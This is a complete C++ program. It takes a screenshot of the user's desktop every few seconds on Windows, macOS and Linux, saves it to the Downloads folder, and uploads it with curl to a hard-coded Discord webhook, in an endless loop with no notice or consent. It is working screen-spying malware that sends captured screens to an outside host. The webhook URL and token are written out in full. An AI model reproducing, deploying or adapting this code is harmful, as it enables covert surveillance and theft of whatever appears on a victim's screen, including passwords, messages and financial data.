#include <cstdlib>
#include <string>
#include <thread>
#include <chrono>
#include <cstdio>       // std::remove
#include <iostream>

#ifdef _WIN32
#include <windows.h>
#include <shlobj.h>
#include <combaseapi.h>
#include <objbase.h>
#elif __APPLE__
#include <unistd.h>
#elif __linux__
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#endif

std::string getDownloadsPath() {
#ifdef _WIN32
    if (FAILED(CoInitialize(NULL))) {
        char* userProfile = getenv("USERPROFILE");
        return userProfile ? std::string(userProfile) + "\\Downloads" : "C:\\Users\\Public\\Downloads";
    }

    PWSTR path = nullptr;
    HRESULT hr = SHGetKnownFolderPath(FOLDERID_Downloads, 0, NULL, &path);
    std::string result;

    if (SUCCEEDED(hr) && path != nullptr) {
        char buffer[MAX_PATH];
        wcstombs(buffer, path, MAX_PATH);
        result = std::string(buffer);
        CoTaskMemFree(path);
    } else {
        char* userProfile = getenv("USERPROFILE");
        result = userProfile ? std::string(userProfile) + "\\Downloads" : "C:\\Users\\Public\\Downloads";
    }

    CoUninitialize();
    return result;

#elif __APPLE__
    const char* home = getenv("HOME");
    if (home)
        return std::string(home) + "/Downloads";
    else
        return "/Users/Shared/Downloads";
#elif __linux__
    const char* home = getenv("HOME");
    if (!home) {
        struct passwd* pwd = getpwuid(getuid());
        home = pwd ? pwd->pw_dir : "/tmp";
    }
    return std::string(home) + "/Downloads";
#else
    return "./";
#endif
}

bool isCommandAvailable(const std::string& cmd) {
    std::string checkCmd = "which " + cmd + " > /dev/null 2>&1";
    return system(checkCmd.c_str()) == 0;
}

bool isWayland() {
#ifdef __linux__
    const char* sessionType = getenv("XDG_SESSION_TYPE");
    return sessionType && std::string(sessionType) == "wayland";
#else
    return false;
#endif
}

bool isGnome() {
#ifdef __linux__
    const char* gdmSession = getenv("GDMSESSION");
    return gdmSession && std::string(gdmSession).find("gnome") != std::string::npos;
#else
    return false;
#endif
}

void takeScreenshot(const std::string& filepath) {
#ifdef _WIN32
    std::string command = "nircmd.exe savescreenshot \"" + filepath + "\"";
    system(command.c_str());
#elif __APPLE__
    std::string command = "screencapture \"" + filepath + "\"";
    system(command.c_str());
#elif __linux__
    if (isWayland() && isGnome()) {
        // GNOME Wayland session — use gnome-screenshot
        if (isCommandAvailable("gnome-screenshot")) {
            std::string command = "gnome-screenshot -f \"" + filepath + "\"";
            system(command.c_str());
            return;
        } else {
            std::cerr << "gnome-screenshot not found!\n";
        }
    } else {
        // Otherwise try scrot (X11) or grim (if not GNOME Wayland)
        if (isCommandAvailable("scrot")) {
            std::string command = "scrot \"" + filepath + "\"";
            system(command.c_str());
            return;
        }
        if (isCommandAvailable("grim")) {
            std::string command = "grim \"" + filepath + "\"";
            system(command.c_str());
            return;
        }
    }
    std::cerr << "No suitable screenshot tool found (gnome-screenshot, scrot, or grim).\n";
#else
    std::cerr << "Unsupported platform for screenshots.\n";
#endif
}

void sendToWebhook(const std::string& filepath, const std::string& webhookUrl) {
    std::string command = "curl -F \"file=@" + filepath + "\" " + webhookUrl;
    system(command.c_str());
}

int main() {
    std::string downloads = getDownloadsPath();

    std::string webhook = "https://discord.com/api/webhooks/1374041380439199745/ZIWLcvoeNFRFUdmlAuMzIi6gQ4XXy12jv528E7TBKpvolPeYTnIo4otO-9lIDruHSz-4";

    std::string filename = downloads + (
        downloads.back() == '/' || downloads.back() == '\\' ? "" :
#ifdef _WIN32
        "\\"
#else
        "/"
#endif
    ) + "screenshot.png";

    while (true) {
        std::remove(filename.c_str());

        takeScreenshot(filename);

        std::this_thread::sleep_for(std::chrono::milliseconds(500));

        sendToWebhook(filename, webhook);

        std::this_thread::sleep_for(std::chrono::seconds(2));
    }

    return 0;
}

